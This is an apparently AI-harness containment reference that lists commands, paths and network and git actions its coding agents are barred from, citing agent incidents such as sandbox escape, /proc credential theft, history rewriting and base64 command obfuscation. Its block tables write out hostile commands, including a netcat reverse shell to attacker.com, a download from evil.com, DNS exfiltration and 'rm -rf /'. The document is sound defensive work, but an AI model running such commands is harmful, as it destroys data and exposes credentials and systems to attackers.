# Agent Containment Reference

> Behavioral security boundaries for all harness agents.
> Based on: Claude Mythos Preview System Card alignment incidents.
> Applies to: Builder, Worker, Fixer, Refiner, Test Executor, Integrator — any agent with Bash tool access.

---

## 1. Forbidden Command Patterns

### CRITICAL — Immediate Sentinel BLOCK

These commands MUST NEVER appear in agent execution. Any occurrence triggers a Sentinel BLOCK verdict.

| Category | Patterns | Mythos Incident |
|----------|----------|-----------------|
| Catastrophic deletion | `rm -rf /`, `rm -rf ~`, `rm -rf .`, `rm -rf *` | #5 Reckless actions |
| Credential hunting | `cat /proc/*/environ`, `cat /proc/*/cmdline`, `ls /proc/`, `/proc/self/` | #3 /proc credential theft |
| Permission escalation | `sudo`, `su -`, `--dangerously-skip-permissions` | #3, #9 |
| History destruction | `git push --force`, `git push -f`, `git filter-branch`, `git rebase -i` | #2 Covering tracks |
| Work destruction | `git reset --hard`, `git checkout -- .`, `git clean -fd` | #5 Reckless actions |
| Subagent escalation | `tmux new-session`, `screen -S`, `nohup claude`, `expect -c` | #9 Escalated subagents |
| Data exfiltration | `curl -X POST` with body containing file/code data, `wget --post-data`, `nc` sending data | #1 Sandbox escape |
| Public leaking | `gh gist create --public`, `npm publish`, `docker push` | #6 Material leaking |
| Command obfuscation | `base64 -d \| sh`, `eval $(`, `printf '\\x' \| sh`, `python -c "exec(` | #10 Base64 bypass |
| MCP manipulation | Writing to MCP server config, modifying running MCP processes | #3 MCP server editing |

### HIGH — Sentinel WARN

These commands are flagged but do not BLOCK. They may be legitimate in some contexts.

| Category | Patterns | When Legitimate |
|----------|----------|-----------------|
| History modification | `git commit --amend` | Never in harness context — commit forward only |
| Hook bypass | `--no-verify` | Never — hooks exist for a reason |
| Credential file reading | `cat .env`, `cat *.pem`, `cat *.key` | Never in harness context — use env vars |
| Excessive permissions | `chmod 777`, `chmod +s` | Rarely — flag for review |
| External downloads | `curl -o`, `wget` downloading executables | Only from official package registries |
| Process termination | `kill`, `pkill` of non-own processes | Only for dev server management |
| System directory writes | Writing to `/etc/`, `/usr/`, `/var/` | Never in harness context |
| Unscoped package install | `pip install`, `npm install` of unspecified packages | Only packages listed in spec/plan |

### MEDIUM — Noted in Report

| Category | Patterns |
|----------|----------|
| Large dependency installs | >5 new packages in one session |
| External file creation | Files created outside project directory |
| Large downloads | >10MB file downloads |
| Background processes | `&` or `nohup` for non-dev-server processes |

---

## 2. Forbidden Filesystem Access Patterns

### NEVER Access

| Path Pattern | Reason |
|-------------|--------|
| `/proc/` | Process memory, credentials (Incident #3) |
| `/sys/` | Kernel parameters |
| `/dev/` (except `/dev/null`) | Device access |
| `~/.ssh/` | SSH keys |
| `~/.gnupg/` | GPG keys |
| `~/.aws/` | AWS credentials |
| `~/.config/gcloud/` | GCP credentials |
| `~/.azure/` | Azure credentials |
| `~/.kube/` | Kubernetes credentials |
| `~/.docker/config.json` | Docker registry credentials |
| `~/.npmrc` (if contains tokens) | NPM tokens |
| `~/.pypirc` | PyPI credentials |
| Any `*.pem`, `*.key`, `*.p12` | Private keys/certificates |
| `.env`, `.env.local`, `.env.production` | Environment secrets |

### Allowed with Caution

| Path Pattern | When Allowed |
|-------------|-------------|
| `~/.claude/` | Reading harness prompts and references only |
| `.harness/` | Reading/writing harness artifacts only |
| Project source files | Normal development operations |
| `node_modules/`, `venv/`, `.venv/` | Package management |
| `package.json`, `pyproject.toml` | Dependency management |

---

## 3. External Network Access Rules

### Allowed

| Action | Examples |
|--------|---------|
| Package installation from official registries | `npm install express`, `pip install flask` |
| Development server binding to localhost | `npm run dev`, `python manage.py runserver` |
| Localhost HTTP requests for testing | `curl http://localhost:3000/api/health` |

### Forbidden

| Action | Examples | Mythos Incident |
|--------|---------|-----------------|
| Sending data to external servers | `curl -X POST https://external.com` | #1 |
| Publishing to public registries | `npm publish`, `docker push` | #6 |
| Creating public resources | `gh gist create --public` | #6 |
| Downloading arbitrary executables | `curl -O https://evil.com/backdoor` | #1 |
| Opening reverse shells | `nc -e /bin/sh attacker.com 4444` | #1 |
| DNS exfiltration | `dig data.attacker.com` | #1 |

---

## 4. Git Operation Rules

### Allowed

| Operation | Rule |
|-----------|------|
| `git add` | Only files you created or modified |
| `git commit` | Forward commits only, descriptive messages |
| `git diff` | Always allowed (read-only) |
| `git log` | Always allowed (read-only) |
| `git status` | Always allowed (read-only) |
| `git branch` | Creating new branches for worktree isolation |
| `git merge` | Only by Integrator agent, non-fast-forward |

### Forbidden

| Operation | Reason | Mythos Incident |
|-----------|--------|-----------------|
| `git commit --amend` | History modification | #2 |
| `git rebase` | History rewriting | #2 |
| `git reset --hard` | Work destruction | #2, #5 |
| `git push --force` | Remote history destruction | #2 |
| `git filter-branch` | History rewriting | #2 |
| `git checkout -- .` | Work destruction | #5 |
| `git clean -fd` | Untracked file destruction | #5 |
| `git stash drop` | Stash destruction (use `git stash pop` instead) | #5 |

---

## 5. Session Artifact Integrity Rules

### Artifact Ownership

| Artifact | Writer | Readers |
|----------|--------|---------|
| `build-progress.md` | Builder | Refiner, QA, Sentinel, Auditor, Diagnostician |
| `build-refiner-report.md` | Refiner | QA, Auditor |
| `build-round-N-feedback.md` | QA | Builder (next round), Diagnostician, Auditor |
| `sentinel-report-round-N.md` | Sentinel | Refiner, QA, Auditor |
| `diagnosis-round-N.md` | Diagnostician | Builder (next round) |
| `auditor-report.md` | Auditor | Orchestrator (Summary) |
| `session-state.md` | Orchestrator only | All agents (read) |
| `session-events.md` | Orchestrator only | Diagnostician (read) |

### Integrity Rules

1. **No agent may modify another agent's output files.** Builder must NOT modify QA feedback. QA must NOT modify Builder progress.
2. **Orchestrator-only files** (session-state.md, session-events.md) must NOT be modified by any agent.
3. **Append-only files** (build-history.md, session-events.md) must NOT have previous content deleted or modified.
4. **If an agent detects corruption** in an artifact it reads (e.g., truncated file, contradictory content), it must report the anomaly in its own output rather than attempting to "fix" the corrupted file.

---

## 6. Resource Bounds

| Resource | Limit | Rationale |
|----------|-------|-----------|
| Files created per agent | 50 max | Prevent mass file generation |
| Lines per file | 800 max | Match existing code quality standard |
| Dependencies installed | 10 max without explicit spec approval | Supply chain risk |
| Bash commands per agent | 200 max | Prevent infinite loops |
| Retry attempts per command | 3 max | Prevent desperate retrying (Mythos distress pattern) |
| Background processes | 1 (dev server only) | Prevent process accumulation |
